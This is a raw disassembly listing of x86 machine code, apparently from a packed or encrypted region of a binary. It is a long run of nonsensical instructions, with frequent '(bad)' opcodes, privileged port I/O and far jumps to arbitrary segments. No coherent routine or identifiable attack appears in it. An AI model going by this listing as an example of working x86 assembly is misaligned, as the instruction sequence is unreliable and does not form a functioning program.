  414f60:	outs   dx,BYTE PTR ds:[esi]
  414f61:	out    0x21,al
  414f63:	sbb    bl,BYTE PTR [eax-0x26201833]
  414f69:	pushf  
  414f6a:	ja     0x414f2e
  414f6c:	mov    ah,BYTE PTR [ebp-0x15]
  414f6f:	into   
  414f70:	jp     0x414eff
  414f72:	jae    0x414f2b
  414f74:	sub    DWORD PTR [edx+0x75],eax
  414f77:	repz clc 
  414f79:	sub    DWORD PTR [eax-0x7aa584dc],eax
  414f7f:	in     eax,dx
  414f80:	inc    eax
  414f81:	adc    eax,0x2cfeec16
  414f86:	pop    edx
  414f87:	dec    eax
  414f88:	fdivr  DWORD PTR [ebx+eiz*8-0x41319e04]
  414f8f:	repnz cmp al,0xc1
  414f92:	nop
  414f93:	fdiv   DWORD PTR ds:0xfd1691d1
  414f99:	js     0x414f63
  414f9b:	jg     0x414f40
  414f9d:	mov    cs,WORD PTR [esi-0x71]
  414fa0:	lock and DWORD PTR [esi-0x6b095327],0xffffff9f
  414fa8:	mov    ds:0x500ba902,eax
  414fad:	lds    eax,FWORD PTR [edx-0x6d8ca41f]
  414fb3:	adc    eax,0xcdf08a72
  414fb8:	or     cl,al
  414fba:	test   DWORD PTR [eax+ecx*2-0x70],ebx
  414fbe:	push   ss
  414fbf:	stos   BYTE PTR es:[edi],al
  414fc0:	push   0x61
  414fc2:	mov    ecx,0xd9d66ce6
  414fc7:	inc    ecx
  414fc8:	dec    esi
  414fc9:	in     al,0x21
  414fcb:	pop    esi
  414fcc:	lds    edx,FWORD PTR [ebp-0x35]
  414fcf:	mul    dl
  414fd1:	pop    esp
  414fd2:	adc    cl,BYTE PTR [ecx]
  414fd4:	mov    ch,0xaa
  414fd6:	popf   
  414fd7:	stos   DWORD PTR es:[edi],eax
  414fd8:	test   BYTE PTR [ecx+0x4e755079],0x3f
  414fdf:	pop    ebp
  414fe0:	std    
  414fe1:	mov    eax,0xf7f93c8f
  414fe6:	mov    cl,0xb4
  414fe8:	(bad)  
  414fe9:	push   ss
  414fea:	jge    0x414fd2
  414fec:	mov    dh,0x76
  414fee:	push   esi
  414fef:	mov    eax,0xa3235a38
  414ff4:	jg     0x415018
  414ff6:	adc    dl,bh
  414ff8:	adc    bl,dl
  414ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ffb:	ins    DWORD PTR es:[edi],dx
  414ffc:	xlat   BYTE PTR ds:[ebx]
  414ffd:	ins    DWORD PTR es:[edi],dx
  414ffe:	inc    esi
  414fff:	jo     0x414fde
  415001:	fwait
  415002:	out    dx,eax
  415003:	jecxz  0x415005
  415005:	inc    esp
  415006:	bt     DWORD PTR [ebx+ecx*4+0x50],edx
  41500b:	pushf  
  41500c:	mov    edx,0x7008c135
  415011:	div    DWORD PTR [esi-0x37ee3d10]
  415017:	xchg   esi,eax
  415018:	pop    eax
  415019:	inc    edi
  41501a:	imul   ecx,DWORD PTR ds:0xf5cdaffe,0xffffffae
  415021:	add    DWORD PTR [ecx+0xc],ebx
  415024:	fwait
  415025:	leave  
  415026:	jno    0x4150a6
  415028:	mov    bh,al
  41502a:	dec    edi
  41502b:	(bad)  
  41502c:	jl     0x415077
  41502e:	shl    eax,0x2
  415031:	dec    edx
  415032:	sub    bl,bl
  415034:	ja     0x415025
  415036:	int    0x3e
  415038:	or     ecx,ebp
  41503a:	adc    BYTE PTR [ecx],ch
  41503c:	popf   
  41503d:	(bad)  
  41503e:	fdiv   QWORD PTR [edi+0x71]
  415041:	jp     0x41501c
  415043:	mov    ebx,ecx
  415045:	mov    ds:0xcff5591e,al
  41504a:	jb     0x414fe5
  41504c:	mov    bh,0x76
  41504e:	or     BYTE PTR [ebx-0x74],cl
  415051:	add    al,0x47
  415053:	cwde   
  415054:	fwait
  415055:	mov    eax,0xfeefc8a0
  41505a:	pushf  
  41505b:	xchg   dh,ah
  41505d:	mov    ecx,ebx
  41505f:	data16 jns 0x4150c4
  415062:	push   es
  415063:	lods   eax,DWORD PTR ds:[esi]
  415064:	add    ah,BYTE PTR [eax+0x4f1c38b0]
  41506a:	div    BYTE PTR [ebp+0x73c860bf]
  415070:	in     al,dx
  415071:	into   
  415072:	cld    
  415073:	test   al,0xc5
  415075:	sbb    ebx,DWORD PTR [ebx+ebp*2-0x6a55aa42]
  41507c:	in     al,dx
  41507d:	je     0x41509f
  41507f:	mov    BYTE PTR [edi-0x7cb4df7],0xd
  415086:	sub    BYTE PTR [ecx-0x47],al
  415089:	in     eax,0xb5
  41508b:	push   edi
  41508c:	mov    bl,0x87
  41508e:	lea    edi,[ebx+0x16884328]
  415094:	adc    al,0xf6
  415096:	and    al,0xd
  415098:	xchg   ebx,eax
  415099:	pop    esp
  41509a:	sbb    DWORD PTR [ebp+0x73a8364c],esi
  4150a0:	push   es
  4150a1:	or     DWORD PTR [ebx+ecx*8+0x20beab6f],ebp
  4150a8:	mov    ds:0x5ec6b9c5,eax
  4150ad:	daa    
  4150ae:	lds    edx,FWORD PTR [eax-0x6dc2524a]
  4150b4:	mov    edi,0xfb0aafbc
  4150b9:	arpl   WORD PTR gs:[edx],bx
  4150bc:	addr16 xchg edx,eax
  4150be:	xor    BYTE PTR [eax],bl
  4150c0:	mov    edx,0x444de4bf
  4150c5:	test   BYTE PTR [edx-0x45],cl
  4150c8:	or     eax,0x924f15eb
  4150cd:	popa   
  4150ce:	dec    ecx
  4150cf:	push   ebp
  4150d0:	push   0xef507256
  4150d5:	and    ax,0x438d
  4150d9:	iret   
  4150da:	mov    eax,ds:0xfe1c3942
  4150df:	es into 
  4150e1:	shl    BYTE PTR [ebx+edi*4-0x5b61d385],0x69
  4150e9:	icebp  
  4150ea:	test   al,0x52
  4150ec:	ds jns 0x415092
  4150ef:	aaa    
  4150f0:	cmp    ch,BYTE PTR [ebx+0x77d20f51]
  4150f6:	packsswb mm5,mm3
  4150f9:	sub    al,0xef
  4150fb:	stos   WORD PTR es:[edi],ax
  4150fd:	pop    esp
  4150fe:	jmp    0xb86c:0x23fd9036
  415105:	repz adc eax,0x9c74a42a
  41510b:	(bad)  
  41510c:	mov    ecx,0x9312761
  415111:	fsubr  DWORD PTR [edx-0x6ed29440]
  415117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415118:	icebp  
  415119:	call   0x86ebe10
  41511e:	ror    BYTE PTR [eax+0x2a],0xa4
  415122:	push   cs
  415123:	loope  0x4150b6
  415125:	shl    BYTE PTR [ebx],cl
  415127:	jmp    0x44182b7f
  41512c:	add    DWORD PTR [esi+0xd],ebp
  41512f:	ret    
  415130:	sub    eax,DWORD PTR [eax*2+0x294caa3f]
  415137:	cmc    
  415138:	jle    0x415158
  41513a:	adc    dl,dh
  41513c:	arpl   WORD PTR [ebx-0x35],sp
  41513f:	ret    0x79a9
  415142:	das    
  415143:	jae    0x415121
  415145:	xor    al,0xdc
  415147:	hlt    
  415148:	fnstcw WORD PTR [eax+0x237cf61]
  41514e:	retf   
  41514f:	xor    dh,dl
  415151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415152:	inc    esi
  415153:	mov    bh,0xef
  415155:	retf   0x6da3
  415158:	dec    ebx
  415159:	xchg   ecx,eax
  41515a:	dec    ecx
  41515b:	mov    eax,ds:0x451e1671
  415160:	cwde   
  415161:	in     eax,0x5e
  415163:	std    
  415164:	div    DWORD PTR [eax]
  415166:	cmp    ebp,ecx
  415168:	push   esp
  415169:	test   al,0x8a
  41516b:	push   ecx
  41516c:	dec    edi
  41516d:	fbstp  TBYTE PTR [edi+0x77e9138e]
  415173:	mov    esp,0xdf5f1a3e
  415178:	ins    DWORD PTR es:[edi],dx
  415179:	jb     0x415147
  41517b:	inc    esi
  41517c:	ja     0x4151c8
  41517e:	cld    
  41517f:	mov    BYTE PTR [ebx+eax*2+0x42],dh
  415183:	mov    esp,0x9d3e717c
  415188:	outs   dx,DWORD PTR ds:[esi]
  415189:	cwde   
  41518a:	sub    al,0x9a
  41518c:	pop    ecx
  41518d:	push   cs
  41518e:	or     bh,bh
  415190:	or     dl,al
  415192:	stos   DWORD PTR es:[edi],eax
  415193:	bound  esi,QWORD PTR [edx]
  415195:	xchg   BYTE PTR [ebp-0x41],dh
  415198:	loop   0x415190
  41519a:	jnp    0x415162
  41519c:	push   edx
  41519d:	shl    esp,0x5e
  4151a0:	xchg   ebx,eax
  4151a1:	mov    ebp,0x5321724d
  4151a6:	jnp    0x41517f
  4151a8:	in     al,dx
  4151a9:	mov    eax,0xc37bbb0d
  4151ae:	or     eax,0xee56225d
  4151b3:	mov    cl,0xf8
  4151b5:	xor    DWORD PTR [ebp+0x55],esp
  4151b8:	or     BYTE PTR [ebx],dh
  4151ba:	jl     0x4151c6
  4151bc:	inc    esi
  4151bd:	sbb    ch,BYTE PTR [edx+0x2ccbf46a]
  4151c3:	jp     0x4151a5
  4151c5:	sbb    al,0x96
  4151c7:	xor    eax,edi
  4151c9:	lock cmp eax,0xc20315d2
  4151cf:	jne    0x4151d9
  4151d1:	inc    ebx
  4151d2:	pop    esi
  4151d3:	push   es
  4151d4:	adc    cl,dh
  4151d6:	xchg   al,cl
  4151d8:	outs   dx,DWORD PTR es:[esi]
  4151da:	pop    edx
  4151db:	inc    esi
  4151dc:	cmp    eax,0x3861bc35
  4151e1:	outs   dx,BYTE PTR ds:[esi]
  4151e2:	lock adc eax,0xf62fcf95
  4151e8:	xor    edi,DWORD PTR [esi-0x74]
  4151eb:	imul   ebx,DWORD PTR [eax],0x8d23e695
  4151f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f2:	or     dh,ah
  4151f4:	in     eax,0x8
  4151f6:	imul   BYTE PTR [esi-0x15]
  4151f9:	cmp    al,bl
  4151fb:	pop    ecx
  4151fc:	loopne 0x415198
  4151fe:	data16 outs dx,BYTE PTR ds:[esi]
  415200:	ss adc al,0x62
  415203:	adc    BYTE PTR [ebx+eax*1+0x4010c963],al
  41520a:	cmp    al,0xdd
  41520c:	test   eax,0xc83f9d73
  415211:	ins    BYTE PTR es:[edi],dx
  415212:	sahf   
  415213:	and    BYTE PTR [esi+0x75ec182],bh
  415219:	aaa    
  41521a:	pushf  
  41521b:	enter  0x4d40,0xfe
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	popf   
  415221:	inc    ebp
  415222:	jae    0x415247
  415224:	sbb    ecx,edx
  415226:	iret   
  415227:	mov    ss,ebx
  415229:	fwait
  41522a:	imul   edi,DWORD PTR [eax],0xffffffe7
  41522d:	jp     0x4151b0
  41522f:	call   0xe69f03a1
  415234:	sub    BYTE PTR [eax+0x2727873c],bl
  41523a:	arpl   di,si
  41523c:	inc    ecx
  41523d:	mov    al,ds:0xaa58e573
  415242:	dec    edx
  415243:	inc    edi
  415244:	les    edx,FWORD PTR [ebp-0x565dad13]
  41524a:	xchg   esp,eax
  41524b:	xor    BYTE PTR [ecx+0x4d],ah
  41524e:	cmp    al,0x6f
  415250:	mov    BYTE PTR [esi+0x1853c0c5],cl
  415256:	js     0x415238
  415258:	cmp    bl,dh
  41525a:	imul   ecx,DWORD PTR [ebx+ecx*8+0x66ebcfb2],0x92472f39
  415265:	xchg   edi,eax
  415266:	das    
  415267:	or     ch,bh
  415269:	mov    BYTE PTR [edx],bl
  41526b:	lods   eax,DWORD PTR ds:[esi]
  41526c:	pop    esi
  41526d:	push   eax
  41526e:	popf   
  41526f:	nop
  415270:	enter  0x207a,0xed
  415274:	repnz mov dh,0xe6
  415277:	test   al,0x1c
  415279:	icebp  
  41527a:	bound  ebp,QWORD PTR [edx]
  41527c:	gs dec edi
  41527e:	jmp    0x41520b
  415280:	push   edi
  415281:	arpl   WORD PTR ds:0x1475ebc1,ax
  415287:	ret    
  415288:	and    BYTE PTR [esp+eiz*4-0x2a],cl
  41528c:	shl    DWORD PTR [ecx-0x41b6bf09],0xbb
  415293:	das    
  415294:	sub    eax,0x77176d92
  415299:	ss pusha 
  41529b:	enter  0x1a5c,0x6b
  41529f:	jo     0x41525c
  4152a1:	mov    eax,0x2bd91903
  4152a6:	xlat   BYTE PTR ds:[ebx]
  4152a7:	icebp  
  4152a8:	cli    
  4152a9:	ret    0xa622
  4152ac:	and    al,al
  4152ae:	jle    0x41530f
  4152b0:	add    ch,BYTE PTR [ebp+0x7e]
  4152b3:	out    dx,eax
  4152b4:	push   cs
  4152b5:	popf   
  4152b6:	into   
  4152b7:	pop    ds
  4152b8:	push   edx
  4152b9:	push   cs
  4152ba:	sahf   
  4152bb:	mov    dl,0x4a
  4152bd:	loop   0x4152b2
  4152bf:	push   ecx
  4152c0:	xor    ecx,esi
  4152c2:	data16 in al,dx
  4152c4:	out    0xc8,eax
  4152c6:	sub    cl,BYTE PTR [ebx-0x69]
  4152c9:	ins    BYTE PTR es:[edi],dx
  4152ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152cb:	loop   0x415333
  4152cd:	lods   al,BYTE PTR ds:[esi]
  4152ce:	aad    0x32
  4152d0:	mov    edx,0x75d6b607
  4152d5:	loopne 0x415315
  4152d7:	int3   
  4152d8:	(bad)  
  4152d9:	imul   ecx,esi,0x42
  4152dc:	jae    0x4152a5
  4152de:	xor    eax,0xb4d26750
  4152e3:	adc    DWORD PTR [ebx],edi
  4152e5:	cmp    eax,0xbc8d21f7
  4152ea:	xchg   esi,eax
  4152eb:	mov    esp,DWORD PTR ds:0xd2b267
  4152f1:	and    ebp,esp
  4152f3:	jg     0x415357
  4152f5:	sbb    al,cl
  4152f7:	aad    0x3b
  4152f9:	repnz push cs
  4152fb:	add    al,BYTE PTR [eax]
  4152fd:	cmp    eax,0xad695815
  415302:	mov    ch,0x99
  415304:	dec    DWORD PTR [ecx+0x522797c3]
  41530a:	into   
  41530b:	(bad)  
  41530c:	cld    
  41530d:	xchg   edx,eax
  41530e:	in     eax,0x49
  415310:	jp     0x415324
  415312:	dec    ebx
  415313:	jp     0x41536e
  415315:	mov    dh,0x7f
  415317:	sbb    BYTE PTR [ebp-0x28],al
  41531a:	jnp    0x41533e
  41531c:	inc    esi
  41531d:	adc    eax,0xca5f89c6
  415322:	inc    ebx
  415323:	in     eax,dx
  415324:	xor    ebp,DWORD PTR [esp+eiz*4]
  415327:	sbb    eax,0xf4060cbc
  41532c:	sti    
  41532d:	cmp    ebp,DWORD PTR [ebx]
  41532f:	cli    
  415330:	inc    edi
  415331:	xchg   esp,eax
  415332:	test   BYTE PTR [eax+0x146d27c4],bh
  415338:	sub    ebp,ebp
  41533a:	pop    edx
  41533b:	mov    cl,bh
  41533d:	mov    eax,0x3e3e4dce
  415342:	in     eax,0x31
  415344:	std    
  415345:	inc    ebx
  415346:	aad    0x3
  415348:	cmp    esi,edi
  41534a:	xchg   ebx,eax
  41534b:	xlat   BYTE PTR ds:[ebx]
  41534c:	jo     0x41538a
  41534e:	pushf  
  41534f:	fcomp  DWORD PTR cs:[edx-0x1a9ce0cb]
  415356:	lods   eax,DWORD PTR ds:[esi]
  415357:	lahf   
  415358:	xchg   ecx,eax
  415359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535a:	sub    dh,BYTE PTR [eax]
  41535c:	out    dx,al
  41535d:	in     eax,dx
  41535e:	and    eax,0x91f78ab3
  415363:	mov    ebx,0xda907663
  415368:	sbb    esp,esp
  41536a:	cwde   
  41536b:	and    ebx,DWORD PTR [ebx]
  41536d:	mov    esi,0x2f22c65
  415372:	adc    eax,DWORD PTR [esi]
  415374:	ret    0x17d5
  415377:	das    
  415378:	xchg   ebx,eax
  415379:	inc    esi
  41537a:	and    ch,BYTE PTR [edx+eiz*8]
  41537d:	lds    edx,FWORD PTR [edi-0x47ee1886]
  415383:	rol    BYTE PTR [ebx+eiz*1-0xfc3de61],1
  41538a:	jmp    0xd610:0xa593b223
  415391:	outs   dx,BYTE PTR ds:[esi]
  415392:	stos   DWORD PTR es:[edi],eax
  415393:	inc    edx
  415394:	arpl   WORD PTR [edx],di
  415396:	inc    edx
  415397:	mov    edx,edx
  415399:	(bad)  
  41539b:	xchg   ebp,eax
  41539c:	scas   al,BYTE PTR es:[edi]
  41539d:	mov    ch,0xc9
  41539f:	adc    ebx,esi
  4153a1:	mov    ecx,0xbd9c0864
  4153a6:	ins    BYTE PTR es:[edi],dx
  4153a7:	mov    ch,0x89
  4153a9:	mov    bh,0xb8
  4153ab:	push   cs
  4153ac:	push   ss
  4153ad:	in     al,dx
  4153ae:	aaa    
  4153af:	push   edx
  4153b0:	icebp  
  4153b1:	bnd jle 0x4153dd
  4153b4:	inc    eax
  4153b5:	xchg   ebx,eax
  4153b6:	test   al,0xce
  4153b8:	or     eax,0x80135c4f
  4153bd:	inc    esp
  4153be:	jae    0x4153bb
  4153c0:	addr16 pop ebp
  4153c2:	jmp    0x5655:0xaeb90d5c
  4153c9:	fist   DWORD PTR [ebx+0x461a74dd]
  4153cf:	or     al,0x86
  4153d1:	add    al,0x46
  4153d3:	jns    0x415402
  4153d5:	enter  0x2122,0x3d
  4153d9:	push   es
  4153da:	pop    esp
  4153db:	xchg   ecx,eax
  4153dc:	imul   ebx,DWORD PTR [edi+0xd85789e],0x3
  4153e3:	add    BYTE PTR ds:0xfda57e97,ah
  4153e9:	mov    gs,WORD PTR [edx]
  4153eb:	sbb    DWORD PTR [ebp-0x77d37572],ebp
  4153f1:	jmp    0xeca:0x36015b01
  4153f8:	in     al,dx
  4153f9:	mov    cl,al
  4153fb:	sahf   
  4153fc:	sub    esp,edi
  4153fe:	mov    edi,DWORD PTR [esi-0x7]
  415401:	lods   eax,DWORD PTR ds:[esi]
  415402:	int    0x69
  415404:	xor    al,0x66
  415406:	rol    BYTE PTR ds:0x89aeb9e7,1
  41540c:	push   cs
  41540d:	imul   BYTE PTR [ecx+0x18242efb]
  415413:	jp     0x4153f3
  415415:	out    dx,al
  415416:	out    0x58,eax
  415418:	int3   
  415419:	jo     0x41541d
  41541b:	push   0xb08a123e
  415420:	xchg   BYTE PTR [esi],ah
  415422:	mov    ch,0x4f
  415424:	popa   
  415425:	mov    ch,0x26
  415427:	push   0xffffffd8
  415429:	out    dx,eax
  41542a:	mov    eax,0x66dec925
  41542f:	pop    es
  415430:	add    DWORD PTR [ecx+edi*1-0x619ca8c9],0xa49076cc
  41543b:	sub    DWORD PTR [bp+di],eax
  41543e:	adc    al,0x46
  415440:	fcmovb st,st(4)
  415442:	jns    0x4154aa
  415444:	mov    ebp,0x691a2cc5
  415449:	bnd je 0x41545d
  41544c:	push   edi
  41544d:	and    ebx,DWORD PTR [ebp+0x5]
  415450:	adc    edx,0x3a
  415453:	jl     0x4153fe
  415455:	dec    edx
  415456:	ret    
  415457:	dec    edx
  415458:	in     al,0x64
  41545a:	in     eax,0x3f
  41545c:	pop    eax
  41545d:	add    al,0x41
  41545f:	pop    es
  415460:	sub    BYTE PTR [ebp-0x7c2df1d7],bl
  415466:	or     DWORD PTR [edx],ecx
  415468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415469:	fiadd  DWORD PTR [edi-0x1f639f59]
  41546f:	fild   DWORD PTR [eax-0x2c]
  415472:	int    0x5b
  415474:	retf   0x5182
  415477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415478:	lods   eax,DWORD PTR ds:[esi]
  415479:	jmp    0x1f8c:0x9cc5fbcd
  415480:	jp     0x4154ac
  415482:	inc    ebp
  415483:	sbb    DWORD PTR [ebp+0x71d6ec55],edi
  415489:	sub    DWORD PTR ds:0xcd0fe9e3,esp
  41548f:	repnz and al,0x3f
  415492:	pop    eax
  415493:	(bad)  
  415495:	int3   
  415496:	pop    ebp
  415497:	mov    dh,0xe7
  415499:	mov    edx,0x66c9e7e8
  41549e:	jge    0x415480
  4154a0:	popa   
  4154a1:	xchg   ebp,eax
  4154a2:	mov    dh,BYTE PTR es:[esi+eax*8-0x24]
  4154a7:	icebp  
  4154a8:	dec    eax
  4154a9:	sub    eax,0x223967a9
  4154ae:	push   ebx
  4154af:	adc    al,0x4a
  4154b1:	xchg   ecx,eax
  4154b2:	or     eax,esi
  4154b4:	cmp    edi,esp
  4154b6:	mov    edi,0xbb580fb6
  4154bb:	add    eax,0x824beaea
  4154c0:	push   0xffffff86
  4154c2:	into   
  4154c3:	(bad)  
  4154c5:	add    ecx,edi
  4154c7:	and    al,BYTE PTR [esi-0x2e3ba6b5]
  4154cd:	int3   
  4154ce:	test   eax,0x5a140f2a
  4154d3:	out    dx,al
  4154d4:	bound  esp,QWORD PTR [ecx+eiz*8+0x6555012e]
  4154db:	adc    bh,BYTE PTR [eax-0x7e]
  4154de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154df:	fs jo  0x4154cc
  4154e2:	pop    ecx
  4154e3:	popa   
  4154e4:	inc    esp
  4154e5:	out    0xa0,eax
  4154e7:	test   DWORD PTR [edx],esp
  4154e9:	or     BYTE PTR [ebp+0x5c7cffa8],ch
  4154ef:	push   ss
  4154f0:	and    BYTE PTR [ecx+0x4f],dh
  4154f3:	xlat   BYTE PTR ds:[ebx]
  4154f4:	outs   dx,DWORD PTR ds:[esi]
  4154f5:	push   0xffffff9d
  4154f7:	inc    edx
  4154f8:	je     0x415493
  4154fa:	cld    
  4154fb:	pop    ecx
  4154fc:	fild   QWORD PTR [edx+0x19dab3a]
  415502:	push   ebp
  415503:	or     dl,al
  415505:	nop
  415506:	mov    al,0xa8
  415508:	xlat   BYTE PTR ds:[ebx]
  415509:	mov    esi,0xd00ed87d
  41550e:	vunpckhps ymm4,ymm6,YMMWORD PTR ds:0x311d5d33
  415516:	mov    ah,ch
  415518:	repz test BYTE PTR es:[esi+eiz*4-0x250f821e],bl
  415521:	cmp    eax,0xae739e24
  415526:	nop
  415527:	adc    DWORD PTR [eax],ebx
  415529:	jo     0x4154ee
  41552b:	fsubr  st(3),st
  41552d:	or     esi,DWORD PTR [ebp-0x60]
  415530:	pusha  
  415531:	add    esi,DWORD PTR [edx+ecx*4-0x28128a28]
  415538:	bound  eax,QWORD PTR [ebp-0x720c5d19]
  41553e:	dec    eax
  41553f:	push   edi
  415540:	scas   al,BYTE PTR es:[edi]
  415541:	cmc    
  415542:	xchg   esp,eax
  415543:	jmp    0x5897:0x9e871bd9
  41554a:	clc    
  41554b:	sahf   
  41554c:	xlat   BYTE PTR ds:[ebx]
  41554d:	aas    
  41554e:	sub    al,0xde
  415550:	fs sbb al,0x9b
  415553:	aaa    
  415554:	push   ds
  415555:	mov    ds:0xe7c280e4,al
  41555a:	daa    
  41555b:	adc    bh,BYTE PTR [ecx]
  41555d:	les    ebx,FWORD PTR [ebp-0x744ce942]
  415563:	sub    DWORD PTR [edi+0x36243211],eax
  415569:	aad    0x86
  41556b:	mov    BYTE PTR [ebx+edi*2-0x73],dh
  41556f:	cmp    al,bh
  415571:	inc    DWORD PTR [ecx+edx*8]
  415574:	jl     0x415561
  415576:	loopne 0x415549
  415578:	xchg   eax,ebx
  41557a:	xor    DWORD PTR [ecx],0xffffffb3
  41557d:	into   
  41557e:	loopne 0x4155a6
  415580:	sti    
  415581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415582:	mov    BYTE PTR [edi+ecx*2],bh
  415585:	(bad)  
  415586:	sbb    al,0xbb
  415588:	nop
  415589:	cmp    al,0xbe
  41558b:	inc    ecx
  41558c:	cmp    al,0xd3
  41558e:	in     eax,0x21
  415590:	fwait
  415591:	mov    BYTE PTR [edx+ebp*8+0x3a763346],cl
  415598:	xchg   ebx,eax
  415599:	call   0x85e4e51f
  41559e:	jno    0x415600
  4155a0:	jg     0x41554d
  4155a2:	jno    0x415574
  4155a4:	dec    edi
  4155a5:	dec    ecx
  4155a7:	sbb    DWORD PTR [ebx+eiz*2-0xdf184f0],esp
  4155ae:	jnp    0x41553c
  4155b0:	jl     0x4155a3
  4155b2:	cmp    al,0x22
  4155b4:	mov    ah,0xbf
  4155b6:	mov    ds:0xc3814c2,al
  4155bb:	fadd   st(4),st
  4155bd:	adc    bl,bl
  4155bf:	jle    0x415602
  4155c1:	nop
  4155c2:	out    0x77,al
  4155c4:	xchg   edi,eax
  4155c5:	scas   al,BYTE PTR es:[edi]
  4155c6:	repz pop ss
  4155c8:	pop    es
  4155c9:	aaa    
  4155ca:	xor    eax,DWORD PTR [esi+0x4d6a8efb]
  4155d0:	arpl   WORD PTR [edx+eiz*8],dx
  4155d3:	ficom  DWORD PTR [eax+0x17e5f1b1]
  4155d9:	mov    WORD PTR [ecx-0x80],es
  4155dc:	mov    BYTE PTR gs:[edi-0x69],cl
  4155e0:	cmp    DWORD PTR [esi+edx*1],edx
  4155e3:	cmp    ah,bh
  4155e5:	shl    BYTE PTR [edi],1
  4155e7:	ret    
  4155e8:	addr16 je 0x415608
  4155eb:	jo     0x41562d
  4155ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ee:	adc    eax,0xb09401a2
  4155f3:	ret    
  4155f4:	dec    ecx
  4155f5:	mov    edi,0x14d747b3
  4155fa:	jbe    0x415675
  4155fc:	je     0x415666
  4155fe:	mov    esi,0x9253fad4
  415603:	aad    0xfa
  415605:	add    eax,0x46f7852e
  41560a:	enter  0x36a8,0xe1
  41560e:	push   ss
  41560f:	fild   QWORD PTR [esi+0x255df4de]
  415615:	into   
  415616:	and    bh,dl
  415618:	addr16 pop ebx
  41561a:	jge    0x4155b0
  41561c:	add    al,0x17
  41561e:	cmp    ebp,DWORD PTR [ebp-0x15]
  415621:	mov    ds:0xa13825da,al
  415626:	stos   BYTE PTR es:[edi],al
  415627:	jl     0x415680
  415629:	jge    0x415632
  41562b:	js     0x4155f4
  41562d:	out    0x93,al
  41562f:	or     edx,eax
  415631:	add    BYTE PTR [ecx+0x62],0x82
  415635:	adc    BYTE PTR [ebp-0x76],al
  415638:	xchg   ebx,eax
  415639:	xor    al,0x49
  41563b:	xor    bh,dl
  41563d:	out    dx,al
  41563e:	xchg   esp,eax
  41563f:	cdq    
  415640:	jl     0x4155d8
  415642:	outs   dx,BYTE PTR ds:[esi]
  415643:	jle    0x41567f
  415645:	loopne 0x415695
  415647:	repz xchg esi,eax
  415649:	xchg   ecx,eax
  41564a:	dec    edi
  41564b:	dec    ecx
  41564c:	mov    eax,ds:0x2b7b6a5b
  415651:	(bad)  
  415652:	fsub   QWORD PTR [edi-0x49]
  415655:	(bad)  
  415656:	lds    ebx,FWORD PTR [eax+0x32]
  415659:	dec    edi
  41565a:	xor    DWORD PTR [eax],ebx
  41565c:	or     BYTE PTR [edi+0x2f2b0cf6],dh
  415662:	ins    BYTE PTR es:[edi],dx
  415663:	push   0x71
  415665:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415667:	push   edx
  415668:	lock retf 
  41566a:	inc    ebp
  41566b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566c:	push   edi
  41566d:	je     0x415601
  41566f:	popa   
  415670:	sbb    eax,0x6ea52e91
  415675:	xchg   DWORD PTR [ecx-0x78],ecx
  415678:	cmp    dl,BYTE PTR [ecx]
  41567a:	ret    
  41567b:	daa    
  41567c:	mov    edi,0xa437e553
  415681:	(bad)  
  415682:	xchg   ebp,eax
  415683:	xchg   edx,eax
  415684:	dec    ebp
  415685:	sub    esp,DWORD PTR [edi+edi*4]
  415688:	mov    WORD PTR [ecx],es
  41568a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41568c:	or     eax,0x2a6ec5f3
  415691:	inc    ebp
  415692:	inc    esi
  415693:	dec    esi
  415694:	and    edx,ecx
  415696:	jmp    0x4f666bb5
  41569b:	dec    edi
  41569c:	mov    edx,0xf9013804
  4156a1:	inc    ecx
  4156a2:	adc    al,0x74
  4156a4:	xchg   ebx,eax
  4156a5:	repnz sub bl,bh
  4156a8:	jno    0x4156cf
  4156aa:	sti    
  4156ab:	retf   
  4156ac:	jp     0x41564c
  4156ae:	push   es
  4156af:	dec    edx
  4156b0:	mov    WORD PTR [eax],?
  4156b2:	call   DWORD PTR [eax+0x7247eb2e]
  4156b8:	mov    ah,0xc0
  4156ba:	aaa    
  4156bb:	leave  
  4156bc:	div    DWORD PTR [edx]
  4156be:	inc    ecx
  4156bf:	ins    DWORD PTR es:[edi],dx
  4156c0:	sbb    DWORD PTR [ecx+0x3b28656d],0xc4709af8
  4156ca:	icebp  
  4156cb:	pop    es
  4156cc:	stos   BYTE PTR es:[edi],al
  4156cd:	clc    
  4156ce:	add    eax,0xed0851e9
  4156d3:	or     eax,0xd0825aa5
  4156d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d9:	fisub  DWORD PTR [esi+ebp*4]
  4156dc:	adc    eax,0xd64f3f8e
  4156e1:	dec    esi
  4156e2:	add    DWORD PTR [ebp-0x10c3fd59],0xffffffbe
  4156e9:	push   ss
  4156ea:	retf   
  4156eb:	pop    esi
  4156ec:	add    dl,BYTE PTR [ebx-0x5fbe534a]
  4156f2:	shr    DWORD PTR [esi],0xf1
  4156f5:	lahf   
  4156f6:	push   ds
  4156f7:	data16 or BYTE PTR [ecx-0x1a],cl
  4156fb:	out    dx,al
  4156fc:	sbb    BYTE PTR [edi+ebx*4-0x426911c7],dl
  415703:	in     eax,dx
  415704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415705:	and    ebp,edx
  415707:	cmp    esp,DWORD PTR [ebx]
  415709:	cmc    
  41570a:	inc    esp
  41570b:	ins    BYTE PTR es:[edi],dx
  41570c:	fsubrp st(0),st
  41570e:	cli    
  41570f:	or     bh,BYTE PTR [esi+0x7a]
  415712:	push   eax
  415713:	dec    esi
  415714:	lods   al,BYTE PTR ds:[esi]
  415715:	mov    BYTE PTR [ebx-0x4c07366f],dl
  41571b:	outs   dx,DWORD PTR ds:[esi]
